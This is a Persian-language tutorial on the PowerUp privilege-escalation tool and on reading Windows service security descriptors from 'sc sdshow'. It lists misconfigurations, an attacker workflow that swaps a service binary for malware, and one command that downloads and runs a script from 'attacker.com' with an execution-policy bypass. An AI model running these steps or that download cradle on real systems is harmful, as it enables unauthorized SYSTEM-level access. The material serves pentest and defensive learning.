
---

### 🔹 PowerUp چیست؟

PowerUp یکی از ابزارهای معروف **PowerShell** است که توسط _PowerSploit_ توسعه داده شده.  
کار اصلیش **یافتن راه‌های احتمالی برای افزایش سطح دسترسی (Privilege Escalation)** در ویندوز هست.  
یعنی کمک می‌کنه بفهمی چه تنظیمات، آسیب‌پذیری‌ها یا اشتباهات امنیتی می‌تونن باعث بشن کاربر عادی به ادمین یا SYSTEM ارتقا پیدا کنه.

---

### 🔹 سناریو استفاده

فرض کن مهاجم روی یک سیستم ویندوز **اکسس محدود (Low-Priv User)** داره.  
برای اینکه بتونه کارهای بیشتری بکنه (مثل اجرای ابزارهای امنیتی، دستکاری سرویس‌ها، یا dump گرفتن از حافظه) نیاز به دسترسی **Administrator یا SYSTEM** داره.

PowerUp با اجرای اسکریپت PowerShell سیستم رو بررسی می‌کنه و موارد زیر رو نشون میده:

---

### 🔹 قابلیت‌های PowerUp

1. **Misconfigured Services (سرویس‌های اشتباه کانفیگ شده)**
    
    - سرویس‌هایی که روی حالت **Auto-run** هستن اما کاربر دسترسی نوشتن روی باینریش داره → میشه باینری رو جایگزین کرد و بعد با ریستارت سرویس کد دلخواه اجرا کرد.
        
    
    📌 دستور:
    
    ```powershell
    Invoke-AllChecks
    ```
    
2. **Unquoted Service Paths (مسیرهای بدون کوتیشن)**
    
    - اگه مسیری مثل این باشه:
        
        ```
        C:\Program Files\Some App\app.exe
        ```
        
        ویندوز ممکنه دنبال فایل‌های میانی هم بگرده (مثل `C:\Program.exe`) → مهاجم می‌تونه فایل مخرب بذاره.
        
3. **DLL Hijacking**
    
    - پیدا کردن سرویس‌هایی که DLL از مسیرهایی لود می‌کنن که کاربر می‌تونه توش بنویسه. → مهاجم DLL مخرب خودش رو جایگزین می‌کنه.
        
4. **Credential Harvesting**
    
    - پیدا کردن پسوردهای ذخیره‌شده در رجیستری، سرویس‌ها یا Scheduled Tasks.
        
5. **AlwaysInstallElevated**
    
    - اگر Group Policy اشتباه کانفیگ شده باشه، کاربر عادی می‌تونه MSI با دسترسی Admin نصب کنه.
        
    
    📌 تست:
    
    ```powershell
    Get-RegistryAlwaysInstallElevated
    ```
    
6. **Scheduled Tasks**
    
    - بررسی Taskهایی که با دسترسی بالا اجرا می‌شن ولی مسیر یا باینری قابل تغییر توسط کاربر هست.
        
7. **Kernel Exploits Check**
    
    - بررسی اینکه آیا سیستم به اکسپلویت‌های شناخته‌شده‌ی کرنل آسیب‌پذیره یا نه.
        

---

### 🔹 مثال ساده

```powershell
powershell -exec bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1'); Invoke-AllChecks"
```

- اول اسکریپت رو دانلود و اجرا می‌کنیم.
    
- بعد با `Invoke-AllChecks` کل سیستم بررسی میشه و خروجی نشون میده چه جاهایی میشه Privilege Escalation کرد.
    

---

### 🔹 کاربرد در سناریوی واقعی

1. دسترسی محدود گرفتی (مثلاً از طریق فیشینگ یا اکسپلویت یک نرم‌افزار).
    
2. اسکریپت PowerUp رو اجرا می‌کنی.
    
3. خروجی بهت میگه: مثلاً سرویس `BackupService` مسیر باینریش قابل نوشتنه.
    
4. باینری رو با بدافزار خودت جایگزین می‌کنی.
    
5. سرویس رو ریستارت می‌کنی → شل با دسترسی SYSTEM می‌گیری.
    


---

🔹 **Invoke-AllChecks**  
👉 پرکاربردترین سوئیچ هست. همه‌ی چک‌های موجود برای پیدا کردن privilege escalation misconfiguration رو اجرا می‌کنه.

---

🔹 **Get-ServiceUnquoted**  
👉 سرویس‌هایی رو پیدا می‌کنه که **Unquoted Service Path** دارن (یعنی مسیر باینری داخل رجیستری یا تنظیمات سرویس بدون کوتیشن نوشته شده باشه).  
🔻 حمله: مهاجم می‌تونه باینری مخرب رو در مسیری قرار بده که اول اجرا بشه.

---

🔹 **Get-ModifiableServiceFile**  
👉 سرویس‌هایی رو پیدا می‌کنه که فایل اجرایی‌شون (exe) توسط کاربر قابل تغییر (write/modify) هست.  
🔻 حمله: جایگزینی فایل exe سرویس با بدافزار.

---

🔹 **Get-ModifiableServiceRegistry**  
👉 سرویس‌هایی که کلیدهای رجیستری‌شون توسط کاربر قابل تغییر هست.  
🔻 حمله: تغییر مسیر باینری سرویس به یک payload.

---

🔹 **Get-UnattendedInstallFile**  
👉 فایل‌های **Unattended Windows Install** رو پیدا می‌کنه که ممکنه شامل پسورد plaintext ادمین باشن.

---

🔹 **Get-CachedGPPPassword**  
👉 پسوردهای ذخیره‌شده در Group Policy Preferences (در SYSVOL) رو پیدا می‌کنه.  
🔻 حمله: این پسوردها قبلاً با کلید AES ثابت رمزگذاری می‌شدن و قابل Decrypt هستن.

---

🔹 **Get-RegistryAlwaysInstallElevated**  
👉 بررسی می‌کنه که آیا پالیسی **AlwaysInstallElevated** فعال هست یا نه.  
🔻 حمله: اگر فعال باشه، هر MSI می‌تونه با دسترسی SYSTEM نصب بشه.

---

🔹 **Get-WeakServicePermissions**  
👉 سرویس‌هایی رو لیست می‌کنه که کاربر مجوز Start/Stop/Change روی اون‌ها داره.

---

🔹 **Get-InstalledSoftware**  
👉 لیست نرم‌افزارهای نصب‌شده رو می‌ده تا اکسپلویت احتمالی بررسی بشه.

---

یعنی در عمل تو می‌تونی خیلی ساده:

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

و بعد تمام misconfigurationها رو یک‌جا ببینی.

---


---

## 🔹 دستور `sc sdshow servicename`

این دستور **Security Descriptor (SD)** مربوط به یک سرویس رو نشون می‌ده.

📌 **Security Descriptor** چی هست؟

- در ویندوز هر Object (مثل سرویس، فایل، رجیستری و …) یک **SD** داره.
    
- SD
- مشخص می‌کنه چه کسی چه دسترسی‌ای روی اون Object داره.
    
- شامل **DACL (Discretionary Access Control List)** و **SACL (System ACL)** هست.
    

---

### مثال:

```powershell
sc sdshow Schedule
```

این Security Descriptor سرویس **Task Scheduler** رو نشون میده. خروجی چیزی شبیه این میشه:

```
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)...
```

---

## 🔹 بخش‌های خروجی

- `D:` → یعنی DACL (لیست دسترسی‌ها).
    
- `(A;;...;;;SY)` → ACE (Access Control Entry) برای یک SID خاص.
    
    - `A` → Allow (اجازه داده شده).
        
    - `SY` → LocalSystem account.
        
    - `BA` → Built-in Administrators.
        
    - `SU` → Service SID یا کاربر خاص.
        

هر قسمت تعیین می‌کنه چه عملیاتی مثل **Start, Stop, Change Config, Delete** روی سرویس مجازه.

---

## 🔹 کاربرد برای ما (Pentester / Defender)

- اگر یک سرویس **Misconfigured SD** داشته باشه (مثلاً کاربر عادی بتونه Config یا Binary Path رو تغییر بده)، اون وقت میشه **Privilege Escalation** کرد.
    
- ابزارهایی مثل **PowerUp** یا **winPEAS** دقیقاً همین خروجی `sc sdshow` رو تحلیل می‌کنن.
    

---

---

### 1. ساختار خروجی
مثلاً:
```
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)...
```

- `D:` → یعنی DACL (لیست مجوزها).  
- `(A;; ... ;;; SY)` → یک ACE (Access Control Entry).  
  - `A` = Allow  
  - `SY` = SYSTEM  
  - `BA` = Built-in Administrators  
  - `AU` = Authenticated Users  
  - `BU` = Built-in Users  

---

### 2. پرمیژن‌ها (حروف داخلش)
این‌ها کدهای دسترسی هستن:  

| کد  | معنی                         | کاربرد                               |
| --- | ---------------------------- | ------------------------------------ |
| CC  | SERVICE_QUERY_CONFIG         | دیدن تنظیمات سرویس                   |
| LC  | SERVICE_QUERY_STATUS         | دیدن وضعیت سرویس                     |
| SW  | SERVICE_ENUMERATE_DEPENDENTS | لیست وابستگی‌ها                      |
| RP  | SERVICE_START                | اجازه Start کردن سرویس               |
| WP  | SERVICE_STOP                 | اجازه Stop کردن سرویس                |
| DT  | SERVICE_PAUSE_CONTINUE       | Pause/Resume سرویس                   |
| LO  | SERVICE_INTERROGATE          | گرفتن وضعیت                          |
| CR  | SERVICE_USER_DEFINED_CONTROL | کنترل سفارشی                         |
| RC  | READ_CONTROL                 | دیدن ACL                             |
| SD  | DELETE                       | حذف سرویس ❗                          |
| WD  | WRITE_DAC                    | تغییر ACL ❗                          |
| WO  | WRITE_OWNER                  | تغییر مالک ❗                         |
| DC  | SERVICE_CHANGE_CONFIG        | تغییر مسیر باینری یا تنظیمات سرویس ❗ |

---

### 3. کجا خطرناک میشه؟
اگر در خروجی یکی از این مجوزها برای کاربر عادی (مثلاً `BU` یا `AU`) وجود داشت، میشه privilege escalation کرد:

- **`SERVICE_CHANGE_CONFIG (DC)`** → مهاجم می‌تونه مسیر binary path رو تغییر بده و کد خودش رو بذاره → اجرای سرویس = اجرای کد با سطح SYSTEM.  
- **`WRITE_DAC (WD)`** → می‌تونه ACL رو تغییر بده و دسترسی کامل به خودش بده.  
- **`WRITE_OWNER (WO)`** → مالکیت سرویس رو بگیره و بعد دسترسی بده.  
- **`DELETE (SD)`** → حذف سرویس و ساختن مجدد با binary خودش.  

```python
C:\Windows\System32>sc  sdshow elasticendpoint

D:(D;;DCWPDTCRSDWDWO;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;OICI;CCLCSWRPLORC;;;S-1-19-512-1536-1701601651-1953063712-9-0-2-0)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

C:\Windows\System32>
```

---

### 4. مثال تحلیل
```
(A;;CCLCSWRPWPDTLOCRRC;;;AU)
```
اینجا → **Authenticated Users** دسترسی‌هایی دارن (AU).  
اگر بین پرمیژن‌ها `DC`, `WD`, یا `WO` ببینی → سرویس آسیب‌پذیره.  

---

### 5. ابزارهای کمکی
برای راحت‌تر شدن کار:  
- `accesschk.exe -uwcqv "Users" * /accepteula` (از Sysinternals) → بررسی دسترسی کاربران به سرویس‌ها.  
- `PowerUp` → تابع `Get-ModifiableService` سرویس‌های قابل سوءاستفاده رو لیست می‌کنه.  
- `winPEAS` → خودش ACL سرویس‌ها رو تحلیل می‌کنه.  

---

✅ نتیجه:  
برای تحلیل خروجی `sc sdshow` باید دنبال **DC**, **WD**, **WO**, یا **SD** بگردی و ببینی به گروه‌های Low-privilege (مثل Users, Authenticated Users, Everyone) داده شده یا نه.  

---

